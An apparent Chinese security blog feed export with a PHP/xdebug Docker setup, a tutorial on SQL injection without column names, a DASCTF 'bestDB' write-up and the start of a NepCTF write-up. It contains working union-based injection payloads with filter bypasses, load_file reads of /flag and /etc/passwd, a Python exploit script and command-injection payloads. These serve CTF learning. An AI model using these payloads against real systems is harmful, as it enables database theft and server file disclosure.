\"xdebug.remote_enable=On\nxdebug.remote_host=host.docker.internal\nxdebug.remote_port=9000\nxdebug.auto_trace=On\nxdebug.collect_vars=On\nxdebug.collect_return=On\nxdebug.collect_params=On\nxdebug.idekey=phpstorm\nxdebug.remote_log='/tmp/xdebug.log'\" >> /usr/local/etc/php/conf.d/myconfig.ini"</span>]</span><span class="token instruction"><span class="token keyword">RUN</span>  docker-php-ext-install mysqli <span class="token operator">\</span>    &amp;&amp; pecl install xdebug-2.9.0 \ # 最好也指定下版本</span>    &amp;&amp; docker-php-ext-enable xdebug<span class="token instruction"><span class="token keyword">RUN</span> apache2ctl restart</span></code></pre><p>在docker-compose.yml所在目录运行<code>docker-compose up -d</code></p><img src="/article/phpstormdebug/image-20210331160533708.png" class="" title="dockercompose" loading="lazy"><p>如图所示，在映射目录写个phpinfo，用不同端口访问本地可见版本不同，可以非常灵活地调试</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><p>xdebug模块也加载好了</p><hr><h2 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h2><p>在本地映射目录下新建项目并打开，点击右上角配置</p><img src="/article/phpstormdebug/image-20210331132235844.png" class="" title="configuration" loading="lazy"><img src="/article/phpstormdebug/image-20210331132633011.png" class="" title="con" loading="lazy"><img src="/article/phpstormdebug/image-20210331132745496.png" class="" title="image-20210331132745496" loading="lazy"><p>打开<code>设置Preferences-&gt;Build,Execution,Deployment-&gt;Deployment</code></p><img src="/article/phpstormdebug/image-20210331133638675.png" class="" title="deployment" loading="lazy"><p>打开<code>Run-&gt;Web Server Debug Validation</code></p><img src="/article/phpstormdebug/F4ECC4D5-59CE-4CA5-8304-9DC190624212.png" class="" title="validation" loading="lazy"><p>Chrome浏览器安装debug插件</p><img src="/article/phpstormdebug/image-20210331133929212.png" class="" title="debug" loading="lazy"><img src="/article/phpstormdebug/image-20210331133947378.png" class="" title="xdebug" loading="lazy"><p>然后就可以惹</p><hr><h2 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h2><p>一般来说都是在本地搭建环境，尽量别放有公网vps的服务器上…会被打</p><h3 id="页面测试"><a href="#页面测试" class="headerlink" title="页面测试"></a>页面测试</h3><p>映射目录写phpinfo()，访问对应端口的容器</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><h3 id="mysql测试-一键部署可用"><a href="#mysql测试-一键部署可用" class="headerlink" title="mysql测试(一键部署可用)"></a>mysql测试(一键部署可用)</h3><p>映射目录写<code>mysqltest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;password>"</span><span class="token punctuation">;</span> <span class="token comment">// 自设的mysql密码</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:"</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>http://127.0.0.1:[port]/mysqltest.php</code></p><img src="/article/phpstormdebug/image-20210331161909008.png" class="" title="5.6mysql" loading="lazy"><img src="/article/phpstormdebug/image-20210331161926189.png" class="" title="7.4mysql" loading="lazy"><p>测试完毕</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL无列名注入</title>
      <link href="article/mardasctf/"/>
      <url>article/mardasctf/</url>
      
        <content type="html"><![CDATA[<p>sql注入的姿势</p><span id="more"></span><p>以DASCTF三月赛为例，记录下无列名注入。</p><h2 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h2><p>例如join进行无列名注入，现在有张表<code>table</code>如下</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>question</th><th>token</th></tr></thead><tbody><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>正常<strong>在数据库查询</strong>，表名需带反引号，在php端中<strong>并不需要</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195606802.png" class="" title="table" loading="lazy"><p>假设不知道列名，通过union查询，需猜测列数，这里为5列</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195833956.png" class="" title="union" loading="lazy"><p>如图所示，列名被替换成了数字，</p><table><thead><tr><th>1（派生表列1）</th><th>2（派生表列2）</th><th>3（派生表列3）</th><th>4（派生表列4）</th><th>5（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>我们可以进一步用数字来对应列查询</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329200819627.png" class="" title="union2" loading="lazy"><p>如果反引号被过滤，同样继续用别名代替</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">as</span> d <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329201418814.png" class="" title="别名" loading="lazy"><p>此时派生表如下</p><table><thead><tr><th>1（派生表列1）</th><th>b（原派生表列2）</th><th>3（派生表列3）</th><th>c（原派生表列4）</th><th>d（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>同时查询多个列</p><pre class="language-none"><code class="language-none">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from &#96;table&#96;)a;</code></pre><p><code>0x2d</code>为<code>-</code></p><img src="/article/mardasctf/image-20210329202408382.png" class="" title="concat" loading="lazy"><hr><p>以下是比赛WP</p><h3 id="DASCTF三月赛·bestDB"><a href="#DASCTF三月赛·bestDB" class="headerlink" title="DASCTF三月赛·bestDB"></a>DASCTF三月赛·bestDB</h3><blockquote><p>由于电脑崩了:(  bp和网页都没了，只能凭我写了</p></blockquote><p>进去一个查询框，题目名字有db，肯定是注入了。</p><p>注释中发现hint</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!></code></pre><p>这就建个数据库测试，经测试发现ban了空格和单引号，测试出了payload</p><p><code>-1&quot;union/**/select/**/1,2,3&quot;</code></p><img src="/article/mardasctf/image-20210329193545757.png" class="" title="union" loading="lazy"><p>回显位为1和2，改改以前的脚本，查数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,database(),3"</span><span class="token comment"># databases==========>users</span></code></pre><p>查表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"</span><span class="token comment"># tables==========>f1agdas,users</span></code></pre><p>无列名查询(其实直接查就好，本人复习一下之前的知识)</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"</span><span class="token comment"># data==========>flag.txt</span></code></pre><hr><p>查到<code>f1agdas</code>表里有个<code>flag.txt</code>，应该是利用<code>load_file()</code>函数读取文件，查了下用户</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,user(),3"</span><span class="token comment"># user==========>'root'@'localhost'</span></code></pre><p>肯定有权限了，读了<code>index.php</code>和<code>dbConnect.php</code>，给复现的师傅参考</p><pre class="language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'dbConnect.php'</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'drop'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$item</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Forbidden!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$query</span></span>' OR username = \"<span class="token interpolation"><span class="token variable">$query</span></span>\""</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>&lt;tr>&lt;th>ID&lt;/th>&lt;th>UserName&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;/tr>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/table>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">// dbConnect.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$serve</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'users'</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysqli</span><span class="token punctuation">(</span><span class="token variable">$serve</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'connect error:'</span><span class="token operator">.</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置数据库字符集</span></span></code></pre><p>读取根目录下flag，由于ban了<code>flag</code>，转十六进制即可</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,hex(load_file(0x2f666c6167)),3"</span></code></pre><p><code>hex(&#39;/flag&#39;)==&#39;0x2f666c6167&#39;</code></p><p>结束了</p><p>附上小脚本，虽然没啥用</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 27, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://ea4d13de-db0a-41e5-b303-a843bd51a27b.machine.dasctf.com/?query="</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Forbidden"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,database(),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># databases==========>users</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select group_concat(table_name) from information_schema.tables where table_schema like database()),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># tables==========>f1agdas,users</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select `2` from (select 1,2 union select * from f1agdas limit 1,1)a),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># flag.columns==========>flag.txt</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,hex(load_file(0x2f666c6167)),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># database()</span>    <span class="token comment"># table()</span>    <span class="token comment"># columns()</span>    data<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><p>以下是本人的碎碎念和反思，师傅们可以跳过惹</p><p>经验不足，最后还是没能出这简单题。一方面也是平台的问题，实在太卡了:(</p><p>数据库里写的<code>flag.txt</code>，最后却在根目录<code>/flag</code>。尝试过十六进制<code>/flag</code>读取，可能是因为太卡了，没成功就没再试了，以为就是<code>flag.txt</code>。盲猜有人拿到注入题直接sqlmap开始跑（因为之前我也干过），导致服务器负载太大，或者说运维去三亚了2333</p><p>还尝试了读取一堆无用的东西，以为和 <a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a> 一样</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># @@datadir</span><span class="token comment"># /var/lib/mysql/</span><span class="token comment"># @@basedir</span><span class="token comment"># /usr/</span><span class="token comment"># /etc/host</span><span class="token comment"># 127.0.0.1localhost</span><span class="token comment"># ::1localhost ip6-localhost ip6-loopback</span><span class="token comment"># fe00::0ip6-localnet</span><span class="token comment"># ff00::0ip6-mcastprefix</span><span class="token comment"># ff02::1ip6-allnodes</span><span class="token comment"># ff02::2ip6-allrouters</span><span class="token comment"># 192.168.0.1149fa7a3d75b4f</span><span class="token comment"># /etc/passwd</span><span class="token comment"># root:x:0:0:root:/root:/bin/bash</span><span class="token comment"># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="token comment"># bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="token comment"># sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="token comment"># sync:x:4:65534:sync:/bin:/bin/sync</span><span class="token comment"># games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="token comment"># man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="token comment"># lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="token comment"># mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="token comment"># news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="token comment"># uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="token comment"># proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="token comment"># www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="token comment"># backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="token comment"># list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="token comment"># irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="token comment"># gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="token comment"># nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="token comment"># _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span class="token comment"># mysql:x:101:101:MySQL Server,,,:/var/lib/mysql/:/bin/false</span></code></pre><p>没有线索，盲猜读了个<code>start.sh</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/run/mysqld/mysqld.sock.lock<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp/mysql.sock<span class="token function">usermod</span> <span class="token parameter variable">-d</span> /var/lib/mysql/ mysql<span class="token function">ln</span> <span class="token parameter variable">-s</span> /var/lib/mysql/mysql.sock /tmp/mysql.sock<span class="token function">chown</span> <span class="token parameter variable">-R</span> mysql:mysql /var/lib/mysqlmysqld_safe <span class="token operator">&amp;</span><span class="token function-name function">mysql_ready</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mysqladmin <span class="token function">ping</span> <span class="token parameter variable">--socket</span><span class="token operator">=</span>/run/mysqld/mysqld.sock <span class="token parameter variable">--user</span><span class="token operator">=</span>root <span class="token parameter variable">--password</span><span class="token operator">=</span>root <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token operator">!</span><span class="token punctuation">(</span>mysql_ready<span class="token punctuation">)</span><span class="token keyword">do</span><span class="token builtin class-name">echo</span> <span class="token string">"waiting for mysql ..."</span><span class="token function">sleep</span> <span class="token number">3</span><span class="token keyword">done</span>mysql <span class="token parameter variable">-e</span> <span class="token string">"ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root';flush privileges;"</span> <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-proot</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /db.sql <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    mysql <span class="token parameter variable">-e</span> <span class="token string">"source /db.sql"</span> <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-proot</span>    <span class="token function">rm</span> <span class="token parameter variable">-f</span> /db.sql<span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /flag.sh <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token builtin class-name">source</span> /flag.sh<span class="token keyword">fi</span>apache2-foreground</code></pre><p>然后开始爆<code>/proc/[id]/fd/[id]</code>一去不复返了。平台弄卡也有我的一份～</p><p>甚至还读了apache配置文件等等等，实在是经验不足，还是本人太菜了2333</p><p>做个反思吧，也许哪天羞耻心爆发这段就给我删了。</p><p>写给他人明鉴，写给自己反思。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2021</title>
      <link href="article/Nepctf2021/"/>
      <url>article/Nepctf2021/</url>
      
        <content type="html"><![CDATA[<p>队伍名称：Err0r</p><span id="more"></span><p>队伍情况：</p><img src="/article/Nepctf2021/image-20210322130933265.png" class="" title="rank" loading="lazy"><p>虽然平台八太行，但是部分题目质量很高，本菜鸡爬了，虚心学习。</p><p>本Wp侧重于思路记录，大佬们轻喷…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span><span class="token string backtick-quoted-string">`cat`</span><span class="token punctuation">;</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span><span class="token string backtick-quoted-string">`*>a`</span><span class="token punctuation">;</span>访问<span class="token operator">.</span><span class="token operator">/</span>a</code></pre><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token 